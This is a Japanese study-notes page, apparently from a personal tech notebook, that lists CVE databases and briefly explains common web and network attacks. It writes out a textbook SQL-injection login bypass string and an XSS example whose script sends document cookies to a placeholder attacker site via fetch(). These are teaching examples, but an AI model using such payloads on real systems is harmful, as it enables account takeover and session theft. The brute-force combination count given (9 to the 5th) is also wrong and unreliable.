---
title: 【IT技術の知見】サイバー攻撃＠セキュリティ
description: サイバー攻撃＠セキュリティの知見を記録しています。
---

# サイバー攻撃＠セキュリティ

## はじめに

本サイトにつきまして、以下をご認識のほど宜しくお願いいたします。

> - https://hiroki-it.github.io/tech-notebook/

<br>

## 01. CVE：Common Vulnerabilities and Exposures)

### CVEとは

報告された脆弱性レポートについて、一意な番号をつけて管理した DB のこと。

> - https://www.nic.ad.jp/ja/basics/terms/cve.html
> - https://www.toyo.co.jp/onetech_blog/articles/detail/id=36064

<br>

### CVEのDBの種類

#### ▼ GitHub

GitHub で脆弱性に関する Issue が立てられ、これが致命的であると、CVE に掲載される。

GitHub 上の OSS の CVE は、GitHub Advisory Database で検索できる。

> - https://github.com/advisories

また、各リポジトリのセキュリティの項目で各 OSS の CVE を確認できる。

> - https://docs.github.com/ja/code-security/getting-started/adding-a-security-policy-to-your-repository
> - https://github.com/argoproj/argo-cd/security
> - https://github.com/istio/istio/security

#### ▼ GitLab

GitLab 上の OSS の CVE は、GitLab Advisory Database で検索できる。

> - https://advisories.gitlab.com/

#### ▼ RedHat

RedHat 上の OSS の CVE は、RedHat CVEDB で検索できる。

> - https://access.redhat.com/security/security-updates/cve

<br>

### その他のDB

- NVD
- ICAT

> - https://ja.wikipedia.org/wiki/%E8%84%86%E5%BC%B1%E6%80%A7%E6%83%85%E5%A0%B1%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9

<br>

## 02. サイバー攻撃の種類

### Man In The Middle攻撃 (中間者攻撃)

#### ▼ 中間者攻撃とは

二者間の通信に割り込み、情報漏洩/改竄/なりすましによって通信を攻撃する。

> - https://www.rapid7.com/ja/fundamentals/man-in-the-middle-mitm-attacks/

<br>

### CSRF：Cross-Site Request Forgeries

#### ▼ CSRFとは

ユーザーがとあるフォームからログイン後、セッション ID を保持したまま悪意のあるサイトに接続したとする。

悪意のあるサイトのサーバーは、ユーザーのセッション ID を使用して、ログインしていた元のサイトのサーバーを攻撃する。

サーバーは、正しいフォームからのリクエストと誤認してしまい、攻撃を許容してしまう。

![csrf](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/csrf.png)

> - https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_6.html

<br>

### セッションID固定化

#### ▼ セッションID固定化とは

記入中...

![session-fixation](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/session-fixation.png)

> - https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_4.html

<br>

### Directory traversal

#### ▼ Directory traversalとは

traversal は、横断する (ディレクトリを乗り越える) の意味。

パス名を使用してファイルを指定し、管理者の意図していないファイルを不正に参照またはダウンロードする。

![ディレクトリトラバーサル](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/ディレクトリトラバーサル.jpg)

<br>

### DoS攻撃：Denial of Service (サービス拒否攻撃)

#### ▼ DoS攻撃とは (サービス拒否攻撃)

Web サーバーに大量のリクエストを送信し、障害を起こす手法。

クライアントが 1 つの場合は Dos 攻撃、複数の場合は DDos 攻撃という。

Dos 攻撃は IP アドレスを指定して防御できるが、DDos 攻撃はそれができない。

そのため、同一 IP アドレスのリクエスト数制限や特定の国を指定した IP アドレス制限が必要になる。

![DoS攻撃](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/DoS攻撃.png)

> - https://ja.m.wikipedia.org/wiki/DoS攻撃

#### ▼ EDos

Web サーバーに大量のリクエストを送信し、クラウドサービスの重量課金額を上げさせる手法。

> - https://ja.m.wikipedia.org/wiki/DoS攻撃

<br>

### SQLインジェクション

#### ▼ SQLインジェクションとは

DB のクエリのパラメーターとなる入力に、不正な文字列を入力して不正なクエリを送信させ、DB の情報を抜き取る手法。

ただし、近年は減少傾向にある。

![SQLインジェクション](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/SQLインジェクション.jpg)

#### ▼ 攻撃例

例えば、アプリケーションの認証ロジックに以下のような SQL があるとする。

```mysql
SELECT * from USER where USER_NAME = '{user_name}' and PASSWORD = '{password}'
```

このとき、ログインの入力フォームに以下を入力する。

- ユーザー名：`foo`
- パスワード： `aaa' or '1' ='1`

これにより、以下の Read 処理を実行することになる。

```mysql
SELECT * from USER where USER_NAME = 'foo' and PASSWORD = 'aaa' or '1' ='1'
```

この SQL は、`'1' ='1'` により `true` となり、処理に成功してしまう。

> - https://zenn.dev/mo_ri_regen/articles/sql-injection

<br>

### XSS：Cross Site Scripting

#### ▼ XSSとは

Web アプリによる HTML 出力のエスケープ処理の欠陥を悪用し、利用者の Web ブラウザで悪意のあるスクリプトを実行させる手法。

悪意のある第三者が正常なサイトへ事前にスクリプトを埋め込む。これを実行してしまったユーザーの情報を盗む。

![cross-cite-scripting](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/cross-cite-scripting.png)

#### ▼ 攻撃例

例えば、複数人が使用する掲示板アプリで、悪意のある人が以下のような投稿をしたとする。

```html
<body>
  <p>
    今日の気分は
    <script>
      fetch("https://<Cookieの送信先サイト>/?cookie_data=" + document.cookies);
    </script>
    だよ
  </p>
</body>
```

他の人が掲示板アプリケーションを開くと、上記の投稿内のスクリプトが実行される。

スクリプトは、Cookie をサイトに送信する。

> - https://zenn.dev/oreo2990/articles/d33a264b2d8b4c
> - https://www.tohoho-web.com/ex/xss.html

<br>

### パスワードリスト攻撃

#### ▼ パスワードリスト攻撃とは

漏洩したパスワードを使用して、正面から正々堂々とアクセスする手法。

![パスワードリスト攻撃](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/パスワードリスト攻撃.png)

<br>

### Brute-force攻撃とReverse Brute-force攻撃

#### ▼ Brute-force攻撃とReverse Brute-force攻撃とは

Brute-force は力ずくの意味。ID を固定して、パスワードを総当たりで試す手法。

例えば、5 桁数字のパスワードなら、9 の 5 乗通りの組み合わせを試す。

一方で、Reverse Brute-force は、パスワードを固定して、ID を総当たりで試す手法。

![brute-force-attack_reverse-brute-force-attack](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/brute-force-attack_reverse-brute-force-attack.png)

#### ▼ パスワードのパターン数

記入中...

![パスワードのパターン数](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/パスワードのパターン数.png)

<br>

### レインボー攻撃

#### ▼ レインボー攻撃とは

レインボーテーブルの文字列とハッシュ値の対応関係を元にして、ハッシュ化された暗号からパスワードを推測する手法。

![レインボー攻撃](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/Rainbow攻撃.png)

<br>

### ソーシャルエンジニアリング

#### ▼ ソーシャルエンジニアリングとは

技術的な手法ではなく、物理的な手法 (例：盗み見、盗み聞き、なりすまし、詐欺など) によってパスワードを取得する。これによりアクセスする手法である。

![ソーシャルエンジニアリング](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/ソーシャルエンジニアリング.png)

<br>

### 踏み台攻撃

#### ▼ 踏み台攻撃とは

対象のインターネット内のパソコンに攻撃プログラムを仕込んで配置し、攻撃者からの命令でサーバーを攻撃させる手法 (※ボットを使用した攻撃など)

<br>

### DNS Cache Poisoning

#### ▼ DNS Cache Poisoningとは

キャッシュ DNS サーバーが持つ IP アドレスを偽の IP アドレスに変え、偽のサイトに強制的に接続させる手法。

![DNSキャッシュポイズニング](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/DNSキャッシュポイズニング.gif)

<br>

### Back Door

#### ▼ Back Doorとは

例えば、サイトのカード決済画面やサーバーに潜ませることによって、カード情報を第三者に送信する手法。

![バックドア](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/バックドア.png)

<br>
